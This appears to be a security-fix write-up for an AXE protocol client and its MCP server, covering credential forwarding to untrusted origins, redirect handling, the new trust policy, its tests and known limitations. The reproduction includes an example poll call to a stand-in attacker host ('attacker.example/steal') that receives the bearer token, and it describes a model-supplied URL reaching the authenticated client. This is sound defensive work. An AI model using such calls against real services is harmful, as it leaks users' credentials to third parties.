# 3. Client credentials and network destinations bound to trust boundaries

Phase 1, release-blocking. Branch `review/client-trust`.

## Finding

The review said a manifest discovered at `https://trusted.example` can name `https://untrusted.example` as `baseUrl`, and the client sends its bearer token there; that live-state and poll URLs need the same scrutiny; and that the MCP `axe_poll` tool accepts a model-supplied URL that reaches the authenticated client.

Reproduced in this checkout (at `3dd4ed3`) with the review script's "cross origin credential forwarding" case and three more cases in the same style, all with a mocked `fetch`:

- `AXEClient.discover("https://trusted.example", { auth: "private-token" })` whose manifest names `baseUrl: "https://untrusted.example"`, then `invoke`: the request went to `https://untrusted.example/axe/actions/test.read` with `Authorization: Bearer private-token`.
- `client.poll({ pollUrl: "https://attacker.example/steal" })`: fetched with the bearer token.
- `live.url` was used as given, on any origin and scheme.
- `axe_poll` passed its `pollUrl` argument straight to `client.poll`.
- Redirects: the client left them to `fetch`. Node 24's `fetch`, checked against two local servers, drops `Authorization` on a cross-origin 307 but forwards a custom `x-api-key` header to the target. Discovery hints (`AXE-Manifest` header, `<link rel="axe-manifest">`) were followed to any origin with the configured `headers`.

## Change

`packages/client/src/index.ts`. Every request the package makes goes through one function (`send`) that applies the destination policy:

- **Credential audience.** The anchor is the origin discovery started from; for a manifest passed to `new AXEClient` directly, its `baseUrl` origin. A manifest returned by `discover()` remembers its discovery origin, so `new AXEClient(discovered)` anchors the same way. `auth` and `headers` go to the anchor plus `trust.origins`, nowhere else. `headers` is treated as a credential. The `auth` callback is not called for a request that will not carry credentials.
- **Other origins.** Refused by default. With `trust.allowCrossOrigin`, other https origins are contacted without `auth` or `headers`; host names that are loopback, link-local, private-range, `localhost`, `*.local`, or `*.internal` by spelling stay refused.
- **Redirects.** `redirect: "manual"`, followed by hand for at most five hops; every hop is checked again. Credentials are sent only while the hop's origin equals the original request's. An https-to-http redirect is refused regardless of `allowHttp`. 303, and 301/302 after a POST, become GET without a body; 307/308 keep method and body. An `opaqueredirect` response (browsers) is refused, and so is a response the injected `fetch` redirected across origins by itself.
- **Schemes.** Only http and https; URLs with embedded credentials are refused. `trust.allowHttp`: `"localhost"` (default) permits http only for `localhost`, `127.x.x.x`, `[::1]` origins in the audience; `false` requires https everywhere; `true` permits http anywhere.
- **Hook.** `trust.destinationPolicy(request)` is called for every outbound URL, redirects included, after the built-in checks, with `{ url, kind, credentialed, redirectedFrom? }`; returning false refuses.
- **Errors and inspection.** A refusal throws `AXETrustError` (`url`, `kind`) before anything is sent. `AXEClient.discover` throws when the manifest's `baseUrl` is not authorized. `client.checkDestination(url)` returns `{ allowed, credentialed, reason? }` without sending; the client never fetches handoff URLs, and an agent can use this before showing one. `discover()` reports refused hints in its "No AXE manifest found" message.

Public API added: `ClientOptions.trust`, `DiscoverOptions.trust`, `TrustOptions` (`origins`, `allowCrossOrigin`, `allowHttp`, `destinationPolicy`), `DestinationKind`, `DestinationRequest`, `DestinationDecision`, `AXETrustError`, `AXEClient.checkDestination`.

The policy by destination:

| Destination                                                         | Default                          | Listed in `trust.origins`     | `allowCrossOrigin`, not listed |
| ------------------------------------------------------------------- | -------------------------------- | ----------------------------- | ------------------------------ |
| Anchor origin: discovery, actions, continue, resume, state, poll    | allowed, credentialed            | same                          | same                           |
| `baseUrl` / `live.url` / `pollUrl` / discovery hint, other https origin | refused                      | allowed, credentialed         | allowed, no credentials        |
| Same, loopback or private-range host name                           | refused                          | allowed, credentialed         | refused                        |
| Redirect, same origin                                               | followed, credentialed           | same                          | same                           |
| Redirect, other origin                                              | refused                          | followed, no credentials      | followed, no credentials       |
| Redirect, https to http                                             | refused                          | refused                       | refused                        |
| Plain http                                                          | only authorized loopback origins | same                          | refused unless `allowHttp: true` |
| Handoff `url`, affordance targets                                   | not fetched by the client (affordances resolve to actions under `baseUrl`) | | |
| Any URL `destinationPolicy` rejects                                 | refused                          | refused                       | refused                        |

`packages/mcp/src/index.ts`, localized and commented: the server remembers the `pollUrl` of every `pending` result it returned (bounded, most recent 1000) and `axe_poll` refuses any other without a request. The tool's input schema is unchanged; its description says the URL must be the one the server returned. The client policy applies underneath.

Spec: `spec/AXE-PROTOCOL.md` §17.1, [P-AGENT-4] (credential audience), [P-AGENT-5] (other origins, handoff URLs not fetched), [P-AGENT-6] (redirects), [P-AGENT-7] (schemes), [P-AGENT-8] (host-side gate and egress policy, DNS limits), [P-AGENT-9] (model-facing poll). §19 gains a bullet. All six map to tests in `packages/testing/src/conformance/requirements.ts`.

Docs: `docs/for-agent-builders.md` ("Where the client sends credentials", with the table), `docs/security.md` ("Credential forwarding from the agent side", "Request forgery from a host-side agent", two mitigation rows, one known gap), `docs/mcp.md` (the poll rule), examples `docs/examples/for-agent-builders/trust.ts` and `docs/examples/security/agent-destinations.ts`. Vocabulary rows: `trust`, `allowCrossOrigin`, `allowHttp`, `destinationPolicy`, `checkDestination`. `CHANGELOG.md`, `DECISIONS.md` ("Client trust"), `.changeset/client-trust.md`.

Migration: a client that relied on a cross-origin `baseUrl`, `live.url`, or `pollUrl` adds the origin to `trust.origins`. A browser client whose site redirects an AXE endpoint gets `AXETrustError`; serve the endpoint without the redirect.

## Tests

`packages/client/test/trust.test.ts` (17 tests, mocked `fetch` that records URL, method, `Authorization`, a custom `x-api-key`, and `redirect` mode):

- refuses a discovered manifest whose baseUrl is on another origin; nothing reaches it
- sends credentials to a cross-origin baseUrl listed in trust.origins; run() and present work
- allowCrossOrigin contacts other https origins without auth or headers
- allowCrossOrigin still refuses loopback, link-local, and private host names
- refuses live.url and pollUrl on unauthorized origins, and accepts them same-origin
- does not follow a redirect to an unauthorized origin (301, 302, 303, 307, 308), and never forwards credentials
- follows a same-origin redirect with credentials
- refuses an https-to-http redirect, even to loopback and even with allowHttp: true
- refuses a response the fetch implementation redirected across origins by itself, and opaque redirects
- allows http only for loopback origins the caller chose, unless told otherwise
- does not follow an AXE-Manifest header or link tag to an unauthorized origin
- follows a discovery redirect to an authorized origin only
- destinationPolicy sees every outbound URL, redirects included, and can refuse any

With `packages/client/src/index.ts` stashed, 16 of the 17 fail; the one that passes is the positive case (an approved cross-origin `baseUrl` already worked, and still does).

`packages/mcp/test/mcp.test.ts`: "axe_poll polls only a pollUrl this server returned; a model-supplied URL is refused unfetched". A foreign URL and a forged same-origin poll URL are refused with no request; the issued URL completes with credentials. With `packages/mcp/src/index.ts` stashed it fails: the new client policy still refuses the foreign origin, but the forged same-origin URL is fetched.

Existing tests unchanged and passing: client discovery, `run()`, `present`, live state; MCP; `axe inspect` and `axe preview` against a real `http://127.0.0.1` server in `packages/cli/test/cli.test.ts`.

## Limitations

- URL checks see names, not addresses. DNS rebinding, and a public name that resolves to a private address, pass the built-in checks and `destinationPolicy`. A host-side client needs an egress policy (a forward proxy or firewall refusing private ranges and metadata endpoints), or an injected `fetch` whose connector checks the resolved address. The docs say this; the client does not claim otherwise.
- The private-host check under `allowCrossOrigin` is syntactic: IP literals in the usual private, loopback, link-local, and CGNAT ranges, IPv6 loopback, ULA, link-local, and IPv4-mapped, and the names `localhost`, `*.localhost`, `*.local`, `*.internal`. Other internal names are not recognized.
- In browsers every redirect is refused, because a manual redirect's target is hidden. Same-origin redirects that worked before now fail there.
- An injected `fetch` that ignores `redirect: "manual"` and follows a redirect itself has already sent the request by the time the client sees the response; the client refuses to use it but cannot unsend it.
- `axe_poll`'s memory is per server process and bounded; after a restart, or past 1000 pending results, the model must start the action again.
- `allowHttp` defaults to `"localhost"` rather than `false`; see DECISIONS.md "Client trust" for why.

## Status

Done on `review/client-trust`.
